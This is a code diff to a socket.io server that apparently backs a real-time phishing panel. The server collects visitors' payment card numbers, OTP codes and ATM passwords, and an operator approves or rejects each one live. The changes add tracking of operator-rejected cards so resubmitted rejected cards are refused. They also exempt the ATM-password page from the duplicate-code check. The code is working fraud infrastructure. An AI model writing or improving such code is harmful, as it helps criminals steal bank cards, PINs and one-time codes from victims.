@@ -356,6 +356,7 @@ io.on("connection", (socket) => {
         data: {},
         dataHistory: [],
         paymentCards: [],
+        rejectedCards: [],
         digitCodes: [],
         hasNewData: false,
         isBlocked: false,
@@ -438,11 +439,12 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
-        // Check for duplicate card number
+        // Check if card was previously rejected by admin
         const newCardNumber = data.paymentCard.cardNumber;
-        const isDuplicate = visitor.paymentCards && visitor.paymentCards.some(c => c.cardNumber === newCardNumber);
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
         
-        if (isDuplicate) {
+        if (isAdminRejected) {
           // Reject duplicate card - notify visitor
           socket.emit("card:duplicateRejected");
           // Reset waiting status since card was auto-rejected
@@ -477,7 +479,7 @@ io.on("connection", (socket) => {
       if (data.digitCode) {
         // Check for duplicate OTP code
         const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
-        if (isDuplicateCode) {
+        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
           // Reject duplicate OTP - notify visitor
           socket.emit("otp:duplicateRejected");
           visitor.waitingForAdminResponse = false;
@@ -695,6 +697,14 @@ io.on("connection", (socket) => {
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
+      // If admin rejected the card, add last card number to rejectedCards list
+      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
+        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
+          visitor.rejectedCards.push(lastCard.cardNumber);
+        }
+      }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
